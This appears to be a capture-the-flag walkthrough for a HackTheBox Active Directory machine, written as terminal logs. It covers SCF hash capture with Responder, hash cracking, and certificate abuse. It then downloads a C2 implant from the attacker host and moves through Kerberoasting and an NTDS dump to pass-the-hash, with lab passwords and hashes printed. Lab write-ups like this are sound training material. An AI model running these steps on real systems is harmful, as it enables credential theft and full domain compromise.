| P5f9akPZiXujIkUwHwYDVR0jBBgwFoAUQAbkVLM3mLwiLg4ZNgoYoLHeC4owgcgG
| A1UdHwSBwDCBvTCBuqCBt6CBtIaBsWxkYXA6Ly8vQ049SFRCLVNJWlpMRS1DQSxD
| Tj1zaXp6bGUsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9SFRCLERDPUxPQ0FMP2NlcnRpZmlj
| YXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRp
| b25Qb2ludDCBvQYIKwYBBQUHAQEEgbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDov
| Ly9DTj1IVEItU0laWkxFLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2
| aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPUhUQixEQz1MT0NB
| TD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTA8BgNVHREENTAzoB8GCSsGAQQBgjcZAaASBBB7YfekKJKyQJ4UWzrt
| tIm9ghBzaXp6bGUuSFRCLkxPQ0FMMA0GCSqGSIb3DQEBCwUAA4IBAQCG0Wqi5HRj
| 0/eYGCjnodhwwNG3ZGaS6BeNh04fK0/e/BqkoIhgARti+IMdaBHZNek9lya9zJAv
| l/y8QnTYMM6xsJskEDfjIS/9vkLUYMFEjxQzBBhDMqkSk0L1tHCv++CLmZVnUVsJ
| s+g7IJlq+M1zk2kzleMh7v3QUuxuaHyz/zjyjtlFyYx13IMyBuC4wFu7pVS5dRZ8
| 5cUHmD/QtkrdxfPrRaQdqjAx+g2KOyH9Ea6j5ArDQQl8q/DuK3r8WmMCvfBD28lI
| z527nTRznihiyXeRshPduOUUODwPFQ4vWwtj0+UsPIUjaT5OvI7kdW/1TOVK/lMi
| FmhL2FFDGeEJ
|_-----END CERTIFICATE-----
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Host script results:
|_clock-skew: mean: -5h00m00s, deviation: 0s, median: -5h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-05T08:06:11
|_  start_date: 2022-07-05T07:48:58
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 30362/tcp): CLEAN (Timeout)
|   Check 2 (port 14625/tcp): CLEAN (Timeout)
|   Check 3 (port 34054/udp): CLEAN (Timeout)
|   Check 4 (port 18642/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

➜  ~ smbclient -L //sizzle.htb/
Password for [WORKGROUP\windows_kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	Department Shares Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Operations      Disk      
	SYSVOL          Disk      Logon server share 

➜  ~ smbclient -N '//sizzle.htb/Department Shares'

Many usernames found under 'Users' directory
Determine if any of this share is writable

➜  vi is_writable.sh
Add:

#!/bin/
list=$(find /mnt -type d)
for d in $list
do
	touch $d/x 2>/dev/null
	if [ $? -eq 0 ]
	then
		echo $d " is writable"
	fi
done

➜  chmod 700 is_writable.sh

➜  man mount.smb3
or
➜  man mount.cifs 8

Response:

       mount.smb3 mounts only SMB3 filesystem. It is usually invoked indirectly by the mount(8) command when using the "-t  smb3"  option.   The
       smb3 filesystem type was added in kernel-4.18 and above.  It works in a similar fashion as mount.cifs except it passes filesystem type as
       smb3.

➜  sudo mount -t smb3 -o rw,username=guest,password= '//sizzle.htb/Department Shares' /mnt
➜  sudo sh ./is_writable.sh

Response:

/mnt/Users/Public  is writable
/mnt/ZZ_ARCHIVE  is writable

➜  bat clickMe.scf
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: clickMe.scf
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ [Shell]
   2   │ Command=2
   3   │ IconFile=\\10.10.16.3\testing.ico
   4   │ [TaskBar]
   5   │ Command=ToggleDesktop

➜  sudo responder -I tun0
➜  sudo mount -t smb3 -o rw,username=guest,password= '//sizzle.htb/Department Shares' /mnt
➜  sudo cp clickMe.scf /mnt/Users/Public      

Response:

[SMB] NTLMv2-SSP Client   : ::ffff:10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:531442910b817cf0:4D73F71AC9EE0DE3BF22919ACC8CBBB3:010100000000000000954EE26F90D80163884F9BFE59175A00000000020008005A004A004B00510001001E00570049004E002D0041005400520056005200480045005A0059003900520004003400570049004E002D0041005400520056005200480045005A005900390052002E005A004A004B0051002E004C004F00430041004C00030014005A004A004B0051002E004C004F00430041004C00050014005A004A004B0051002E004C004F00430041004C000700080000954EE26F90D80106000400020000000800300030000000000000000100000000200000C27F4288909B4663C5FC79EE214C4446B8CCBC41E11F12421289AF81D7687F0E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000

➜  hashcat --help | grep -i ntlmv2

   5600 | NetNTLMv2                                           | Network Protocol
  27100 | NetNTLMv2 (NT)                                      | Network Protocol

➜  vi hash.txt
Add:

amanda::HTB:531442910b817cf0:4D73F71AC9EE0DE3BF22919ACC8CBBB3:010100000000000000954EE26F90D80163884F9BFE59175A00000000020008005A004A004B00510001001E00570049004E002D0041005400520056005200480045005A0059003900520004003400570049004E002D0041005400520056005200480045005A005900390052002E005A004A004B0051002E004C004F00430041004C00030014005A004A004B0051002E004C004F00430041004C00050014005A004A004B0051002E004C004F00430041004C000700080000954EE26F90D80106000400020000000800300030000000000000000100000000200000C27F4288909B4663C5FC79EE214C4446B8CCBC41E11F12421289AF81D7687F0E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000

➜  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

Response:

AMANDA::HTB:531442910b817cf0:4d73f71ac9ee0de3bf22919acc8cbbb3:010100000000000000954ee26f90d80163884f9bfe59175a00000000020008005a004a004b00510001001e00570049004e002d0041005400520056005200480045005a0059003900520004003400570049004e002d0041005400520056005200480045005a005900390052002e005a004a004b0051002e004c004f00430041004c00030014005a004a004b0051002e004c004f00430041004c00050014005a004a004b0051002e004c004f00430041004c000700080000954ee26f90d80106000400020000000800300030000000000000000100000000200000c27f4288909b4663c5fc79ee214c4446b8ccbc41e11f12421289af81d7687f0e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000:Ashare1972

Password: Ashare1972

amanda:Ashare1972

➜  smbmap -H sizzle.htb -u amanda -p Ashare1972
[+] IP: sizzle.htb:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Operations                                        	NO ACCESS	
	SYSVOL                                            	READ ONLY	Logon server share 

➜  /opt mkdir python-2-and-3
➜  /opt cd python-2-and-3 
➜  docker pull sculpto/python2-and-3
➜  python-2-and-3 sudo docker run -it sculpto/python2-and-3 /bin/sh
/ # pip install ldapdomaindump
/ # ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ldapdomaindump
/ # cd ldapdomaindump/
/ldapdomaindump # ls
domain_computers.grep  domain_computers_by_os.html  domain_groups.json	domain_policy.json  domain_trusts.json	domain_users.json
domain_computers.html  domain_groups.grep	    domain_policy.grep	domain_trusts.grep  domain_users.grep	domain_users_by_group.html
domain_computers.json  domain_groups.html	    domain_policy.html	domain_trusts.html  domain_users.html

➜  docker ps

CONTAINER ID   IMAGE                   COMMAND     CREATED         STATUS         PORTS     NAMES
d807f13f394e   sculpto/python2-and-3   "/bin/sh"   2 minutes ago   Up 2 minutes             vigilant_brattain

➜  sudo docker cp d807f13f394e:/ldapdomaindump/ /home/windows_kali/htb/Active_Directory_101/Sizzle 

➜  cd ldapdomaindump

➜  ldapdomaindump ls
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep

➜  firefox domain_users.html 
➜  sudo apt install dirsearch
➜  dirsearch --url sizzle.htb

Output File: /home/windows_kali/.dirsearch/reports/sizzle.htb_22-07-05_13-52-30.txt

[13:52:30] Starting: 
[13:52:31] 403 -  312B  - /%2e%2e//google.com
[13:52:36] 403 -    2KB - /Trace.axd
[13:52:36] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[13:52:42] 403 -    1KB - /aspnet_client/
[13:52:42] 301 -  155B  - /aspnet_client  ->  http://sizzle.htb/aspnet_client/
[13:52:43] 403 -    1KB - /certenroll/
[13:52:43] 401 -    1KB - /certsrv/
[13:52:49] 301 -  148B  - /images  ->  http://sizzle.htb/images/
[13:52:49] 403 -    1KB - /images/
[13:52:49] 200 -   60B  - /index.html
[13:52:50] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc
[13:52:50] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage
[13:52:50] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
[13:52:50] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
[13:52:50] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
[13:52:50] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
[13:52:50] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
[13:52:50] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
[13:52:50] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
[13:52:50] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
[13:52:50] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true
[13:52:50] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable

Go to:

http://sizzle.htb/certsrv/

amanda:Ashare1972

➜  openssl genrsa -des3 -out amanda.key 2048
➜  openssl req -new -key amanda.key -out amanda.csr

Go to: Request a certificate -> advanced certificate request -> Saved Request:
Add: 

-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBALnUYlsFvhX8C1zy/aLaXAKr4wi4u1FhbG8VilSU
ZZT6cXOXECnbrt26+XqJBx2nF7/mF0j3jqvslkDttE6M4shIGpsg19Rq37eECmns
a5nhO/S0MTE1ngXZvrMkT0boOfvAVpuNO34+LSPyGRRqlS8S7y0uZYjHbYPb32d0
jr0DKO22y3XfOPcSv92FSQySrXATour4JPZJhu7+Jbe+GsZEJ1upP9lnrjW/4UfH
O8L47xindT0gtHeVCQ0/NKFkgl0o/JKLF6/MncDYFhZGjCBzF904wd0IgsPN7vSU
YLbJYClpzxQN6zVOyYf6Gt+YCTmP+89fT84pGuwHdUKtI+cCAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQC0fiq024WqiblPm/n1KZyFnQvYXqi5v0yyrK8kCQClNQ0c
6zR63sGixwrnXglGoYUE8WNTeK3jvRjad83FuTzX4jRk0rCITXinaFUtaeCInIfV
1hqSfpOpoPgi6orNWDuwjiyW2oA+fBh0AMMgxeiWfslmg0/m8JAd0ilu8JcuRE8B
2c1ApPlkZrfMlgQeDVK0W0PDzcjV3IRFOSg/lHvkL+rP+R3E+tA3+0z53Zh+IqYa
7qZfZ+WCWDz8i4pAhUkrBkueO6S/cZ2di5MpT2MMKLxfRIEVCjw6ZlKOpucTkoMo
m5R1lLKxAH1YKjxFRBEw25KjCD05SiOTv4jZiWTG
-----END CERTIFICATE REQUEST-----

Submit
Certificate Issued: Base 64 encoded
Download certificate

➜  mv ~/ certnew.cer .
➜  evil-winrm -i sizzle.htb -P 5986 --ssl -c certnew.cer -k amanda.key  
➜  cd /opt
➜  sudo git clone --recurse-submodules https://github.com/cobbr/Covenant
➜  cd Covenant/Covenant
➜  docker build -t covenant .
➜  cd /opt/Covenant/Covenant
➜  docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v $PWD/Data:/app/Data covenant --username Admin --computername 0.0.0.0

Password: c0rvu5

Go to:

https://127.0.0.1:7443

Admin:c0rvu5

Go to: Listeners (https://127.0.0.1:7443/listener)
Click:

Create

Change:

Name : sizzle
ConnectAddress: 10.10.16.3

Click:

Create

Go to: Launchers (https://127.0.0.1:7443/launcher)
Generate:
Click:

Binary

Ensure:

Listener: sizzle
ImplantTemplate: GruntHTTP

Take note of the Launcher name:

GruntHTTP.exe

Click:

Generate
Download

➜  mv ~/Downloads/GruntHTTP.exe ~/htb/Active_Directory_101/Sizzle/GruntHTTP.exe
➜  cd ~/htb/Active_Directory_101/Sizzle/GruntHTTP.exe
➜  python -m http.server

*Evil-WinRM* PS C:\Users\mrlky.HTB\Documents> cd C:\Windows\System32\spool\drivers\color
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> invoke-webrequest -Uri “10.10.16.3:8000/GruntHTTP.exe” -OutFile 'C:\Windows\System32\spool\drivers\color\GruntHTTP.exe'

Go to: Dashboard -> Click 'edc04c4dec' -> Interact

(Admin) > GetDomainUser

Find:

samaccountname: mrlky
samaccounttype: USER_OBJECT
distinguishedname: CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
cn: mrlky
objectsid: S-1-5-21-2379389067-1826974543-3574127760-1603
grouptype: 0
serviceprincipalname: http/sizzle

(Admin) > MakeToken amanda htb Ashare1972

Response:

Successfully made and impersonated token for user: htb\\amanda

(Admin) > Kerberoast mrlky hashcat

Response:

$krb5tgs$23$*mrlky$HTB$http/sizzle$93C3897A80161FD49C2AC3D3DC946726$979F9E4D5CFE325DE1D6F93E2419E40F366D13CBCE287AE55E4310776E81DD1D48E157904C4E324B0C6916EFF73711BC452933ED4241A8573D93B52393BAADA862106FF40430708C7AB896E588D745C9B88414ABE12F188E205180DA0A99E146C815D859698C5016F74950895862716BBD1E2DD63B2A2CFFAFD58D3BA82AD0D989EE1B07A958F2D6A0C5EE6B4AC1B33ADB87E7072E737F57A9E60060563B6E00AC01AA0F531D58357CCE7072EED751D6A616EF8818B0827524953D3768CA582EA71418ABBC2F5E2AADB1CA1D54E73289053C3E5271419980B7FD16DAB84B5FFF5AD67FE5F820C7C2ABDB9395CF0F1676CD6F460834964A399D2FECE4B10F3CFDAC28B542FFD8C464602375CAAFC3545788CC270ABA1CCB952134DF83AC4931C834BD91140A5A1F5FD097A30D2D4E04DD06CDEA086FDB19FE1CE3501198E93E66AD87D72C7B3DD181413D28E875193319C5EA9677F28E6C2882C693B078D7EA448286DBB5C430AECA2099C01D52FDC8E4F6121563FAFAFC59EAB70CFCE18EAE73926F7652A2BE7D2AA715F017B8692D75FB04B4790676AF8DD98E6A1E06DB3F6C600CA384F958F5220CF62F0DBA94A9FECAC3CB568C54534BBEC5DD80C12C0F2C12E0A380A6CBF4F9CECFC9939F564E0243985E1E67FCDEC94681E7870028292B20AAD8A4E168519A97748769CADBFD8639919AE4911AD68EBD903E1C3B1CA24871AB431AB1F2820DF68FF0E4EACBF13E2D620AEBAACD397696E9407F03C5CA6049DBB0C435BA6207BED82A65A08C3AB4AFB91BBECD3521BF3C923C47E9200238E4EF8D9CC23853883DBB309F6D63BDB886C7C894CCF46DF784369542D13E10588EDB947375B5ED1BEBDAFB5832657718E10BE71FC5F7A733D5807A0D640482A03BDF4DD58305C632DD98361D50DBBBDAA6982D464C349FBCDBF599ACD801438BFFCF36AAF66FD2A76358A858DBA53FC6BAD6095B7C7EA1F8801EF0A65534CEADFABE0EB3B10206D3211A29B485FB284CD4CAF102DB101B8DFEC2B622E037C35EE5D84D6E6C366689542015AE2C6A2EC4203D96113A6176F2F260496466FDE818BC0CF9E64116F73B6D6522FBF054F5751B12D15213858EE9837BB2DD3C79298CC173049E08BA0C35E5AD5DAB44334A552CE23F3679728DDE6A02487F9531245F478AB637F03F8792AEC288F7B021DBD6A15CDC3481116A67EB94141D4C1C11007EE833075B06BCDF7313A7EDB69A790D35F558675541ADFA7E6E27F9A797A08F7F7BFFD4671BEE0079F7A31C36D62C134A39EFD83715C7A68F12B06C20685FB51994A825523169902DC3F3E75FE9D7F0BBA6C1FD25D7B13B3670E341DD379E72F0229A96DC3EF338767414C488945B818F2396E6569E5E7F10C96D46D2583A58EB35

This hash was non-compliant and did not want to be cracked by the likes of me
Upon further enumeration...

*Evil-WinRM* PS C:\windows\system32> type file.txt

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::

Domain    User  ID  Hash
------    ----  --  ----
HTB.LOCAL Guest 501 -
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::

➜  vi hash_check.txt
Add:

bceef4f6fe9c026d1d8dec8dce48adef

➜  hashcat -m 1000 hash_check.txt /usr/share/wordlists/rockyou.txt

Response:

mrlky:Football#7

➜  openssl genrsa -des3 -out mrlky.key 2048
➜  openssl req -new -key mrlky.key -out mrlky.csr

Go to: (Note I changed to https to initiate a new login with mrlky:Football#7)

https://sizzle.htb/certsrv/certfnsh.asp

Go to: Request a certificate -> advanced certificate request -> Saved Request:
Add: 

-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBAMsUfCVIs4i6MdGG+UcWjxQ2GHYW3Qzn+bAVa72Z
VlhhjiV6eGcz0DFANlz7jS8Umbpj6+9XvVGOV4LJDCa0KgNFz6YstiiZkf3jLCYr
uo3+UVxSqh3mEx6AtOXNN5kGvRXgKJTiXqiGg9uiUwHiV4o4+nhO7JCeZRflDgb/
40ndZhAHisX36dJuIHRsI0AjDaKn710gOZ0BGNmhBhI3rSJi/5RacmPqcFGcvWkg
tFdZBoSs2fWwucYxJEbmh2Aea/7wHH9eQx9+gXnbUWv3F/XhBncgwbFWabZeTTW9
yT5lNtvHwSVUDiCibOxjVd/zTfMRl/KOl9JsF2hmOx+5jv0CAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQCoynwmLUmstd+WstF8ZBaIVTqjGS0ckHKoezgsQG/4eznA
uiQjZTwSV49XlGbqiDFLJDMSrKe2bzZ/8HD1FDH5w3cTB188nFCh7XhRjbW2W+jL
HqZ63owHChnRgboJUoNAVMEBV7V9T/wQIN2jtEkZauKpOKeirGJ5F15yMHNiiTut
MoegqNDcNDgbDTa713HnwyMOHg4z1+QXW14iiF93lgkEO3sn6j9sDruIvIRTu9WW
Uap626//YbfIBwbJrjHf7q02OZK5KEwMuy9VM+Hdy33+b54d8usLoDoZNxIXlTxY
6GTcYnqqCBjBJyfVLISgd+qvzbzoNln5Q2WWrMvE
-----END CERTIFICATE REQUEST-----

Submit
Certificate Issued: Base 64 encoded
Download certificate

➜  mv ~/Downloads/certnew.cer certnew2.cer
➜  evil-winrm -i sizzle.htb -P 5986 --ssl -c certnew2.cer -k mrlky.key  

*Evil-WinRM* PS C:\Users\mrlky.HTB\Documents> get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\mrlky\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/5/2022   3:49 AM             34 user.txt

*Evil-WinRM* PS C:\Users\mrlky.HTB\Documents> type C:\Users\mrlky\Desktop\user.txt

user_flag

➜  impacket-secretsdump htb/mrlky@sizzle.htb

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:3a96b722edf7e4c705e167e52c48e666:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:adbe22111dcdfb8a081963f19a5c048d88ebcb59e08a14d95dad0657a21fba21
SIZZLE$:aes128-cts-hmac-sha1-96:a5008bbc8b98acf596280cae7551b30f
SIZZLE$:des-cbc-md5:3210b6852a4a2ae9
[*] Cleaning up... 

➜  smbclient //sizzle.htb/C$ -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267

Try "help" to get a list of possible commands.

smb: \> get Users\mrlky\Desktop\user.txt

getting file \Users\mrlky\Desktop\user.txt of size 34 as Users\mrlky\Desktop\user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

smb: \> get Users\administrator\desktop\root.txt

getting file \Users\administrator\desktop\root.txt of size 34 as Users\administrator\desktop\root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> ^C

➜  cat Users\\mrlky\\Desktop\\user.txt 

user_flag

➜  cat Users\\administrator\\desktop\\root.txt

root_flag

``````

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705074944.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705073517.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705075014.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705074558.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705080829.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705084851.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705083634.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705083705.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705084113.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705084147.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705085743.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705091234.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705095957.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705100038.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705100140.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705100627.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705100729.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705100859.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705100935.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705101055.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705101226.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705102003.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705144212.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705144243.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705144320.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705144410.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705144121.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705144550.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705144521.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705144817.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705152316.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705152401.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705155455.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705124442.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705130646.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705130616.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705130728.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705140721.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705140756.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220709152628.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705145914.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705150414.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705150608.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705150630.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705150759.png)

![[Pasted image 20220705134146.png]]

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220705135708.png)

#hacking
